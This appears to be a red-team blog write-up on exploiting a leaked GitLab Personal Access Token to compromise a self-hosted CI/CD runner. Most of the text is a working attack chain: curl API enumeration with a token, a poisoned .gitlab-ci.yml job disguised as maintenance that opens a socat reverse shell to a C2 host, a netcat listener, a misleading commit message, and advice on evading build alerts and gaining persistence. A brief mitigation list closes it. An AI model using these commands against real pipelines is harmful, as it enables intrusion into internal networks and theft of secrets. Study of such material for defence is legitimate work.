---
title: "Weaponizing Leaked PATs: A Direct Route to CI/CD Compromise"
date: 2026-03-17
description: "How a single leaked Personal Access Token can be used to pivot from public reconnaissance to internal network execution via GitLab Runners."
summary: "Leaked tokens are often dismissed as 'minor leaks.' In this write-up, we demonstrate how they serve as the ultimate foothold for pivoting into internal infrastructures."
tags: ["Red Team", "CI/CD", "GitLab", "Exploitation", "Initial Access"]
categories: ["Offensive Operations"]
series: ["Pipeline Security"]
image: "featured.jpg"
showTableOfContents: true
draft: false
---

# Introduction: The Weight of a Token

In modern development workflows, **Personal Access Tokens (PATs)** are the invisible keys that keep the machinery running. They are used to authenticate scripts, CI/CD pipelines, and various automation tools without the need for interactive logins. However, from an offensive perspective, a PAT is a high-value asset that often carries more weight than a standard password.

## Defining the Asset: Personal Access Token (PAT)
A PAT serves as a stand-in for traditional credentials. While they are easy to generate and use, they are rarely managed with the same level of scrutiny as master passwords.

* **The Usage:** Developers leverage PATs to allow external tools to communicate with GitLab or GitHub APIs.
* **The Vulnerability:** Tokens are frequently hardcoded into scripts, left in build logs, or shared through insecure collaboration channels.
* **The Exploitation Potential:** Once a token is captured, an operator can impersonate the user, access private codebases, and—most importantly—interact with the CI/CD infrastructure.

## Understanding the Target: GitLab Runners
To turn a token into a shell, we must understand **GitLab Runners**. These are the lightweight agents that execute the instructions defined in an application’s pipeline (usually the `.gitlab-ci.yml` file).

* **Self-Hosted Runners:** Unlike cloud-shared runners, these are installed directly on the organization's internal infrastructure (On-Premises, AWS EC2, GCP VM, etc.).
* **The Strategic Value:** Internal runners often sit behind the firewall but have access to private subnets, internal databases, and deployment clusters. This makes them the perfect pivot point for a Red Team operation.

---

# Reconnaissance: Tracking the Leak
Finding a PAT is the first step in the kill chain. During an engagement, we typically look for these "leaky" spots:

1.  **Source Code Repositories:** Hardcoded tokens in configuration files or scripts.
2.  **Version Control Logs:** Historical commits (`git log`) where a token was added and later "deleted."
3.  **Environment Files:** Accidental uploads of `.env` or `.gitconfig` files.
4.  **Dev Workstations:** Locally stored tokens in compromised developer machines.
5.  **Collaboration Tools:** Slack, Teams, or Jira tickets where tokens were shared for troubleshooting purposes.

---

# The Attack Flow: Poisoning the Pipeline

Compromising a CI/CD pipeline follows a specific logic:

1.  **Initial Access:** The attacker obtains a PAT via one of the recon methods above.
2.  **Code Injection:** Using the PAT, the attacker pushes a malicious update to the pipeline configuration (`.gitlab-ci.yml`).
3.  **Automated Trigger:** The GitLab platform detects the push and assigns the job to an internal Runner.
4.  **Local Execution:** The Self-Hosted Runner executes the malicious instructions inside the organization's network.
5.  **C2 Callback:** The payload initiates a reverse shell, connecting back to the attacker’s Command & Control (C2) server, effectively punching a hole through the firewall from the inside out.

---

# Case Study: Execution & Exploitation

This scenario demonstrates the move from a leaked PAT to a stable reverse shell inside a private network.

### Step 1: API Enumeration (Recon)
With a token in hand, our first move is to map out the accessible projects. We are looking for private repositories with CI/CD enabled.

```bash
curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
'[http://10.8.20.80/api/v4/projects?owned=true](http://10.8.20.80/api/v4/projects?owned=true)' | jq '.[] | {name: .name, id: .id, visibility: .visibility}'

Focus on projects marked as PRIVATE to maximize the impact of the data exfiltration.

Step 2: Verifying Permissions
Before injecting code, we must confirm our privilege level on the target project (e.g., Project ID: 1).

Bash
curl --header 'PRIVATE-TOKEN: glpat-WQNQTESTANDO' \
'[http://10.8.20.80/api/v4/projects/1](http://10.8.20.80/api/v4/projects/1)' | jq '.permissions'
Level 30 (Developer): The minimum required to commit code and trigger a build.

Level 40/50 (Maintainer/Owner): Full control over the project and runner settings.

Step 3: Pipeline Poisoning
We clone the target repository and modify the .gitlab-ci.yml file. To stay under the radar, we disguise our job as a "Security Scan" or "Cleanup Task."

YAML
variables:
  # C2 Connection Details
  C2_HOST: "192.168.100.2"
  C2_PORT: "4445"

stages:
  - build
  - maintenance

infra_cleanup:
  stage: maintenance
  allow_failure: true
  script:
    - echo "Executing routine maintenance..."
    # Socat for a stable, interactive TTY shell
    - socat TCP:$C2_HOST:$C2_PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
The use of allow_failure: true ensures that even if our shell crashes, the pipeline won't trigger a "Failed Build" alert.

Step 4: The Trigger
Start the listener on your C2 server:

Bash
rlwrap nc -nlvp 4445
Now, push the malicious configuration:

Bash
git add .
git commit -m "chore: update ci-cd maintenance script v1.1"
git push
The moment the push hits the server, GitLab triggers the runner. Since it's an internal self-hosted agent, it executes our socat command and hands us a shell directly from the internal LAN.

Impact of Compromise
Once the runner is compromised, an operator can:

Exfiltrate Secrets: Read environment variables and files stored on the runner host.

Establish Persistence: Add an SSH key to authorized_keys or install a persistent agent.

Bypass Controls: Disable SAST/DAST scanning stages to allow vulnerable code into production.

Mitigation Strategies
Securing a CI/CD environment requires more than just revoking a token.

Secret Detection: Implement tools like Gitleaks or TruffleHog to scan commits in real-time and block secrets before they hit the server.

Token Scoping: Enforce the Principle of Least Privilege. Tokens should be scoped to the minimum necessary (e.g., read_repository instead of api).

Ephemeral Environments: Use Docker-based runners that spawn a new, isolated container for every job. This prevents an attacker from establishing persistence on the host machine.

Branch Protection: Require Merge Request (MR) approvals for any changes to pipeline files.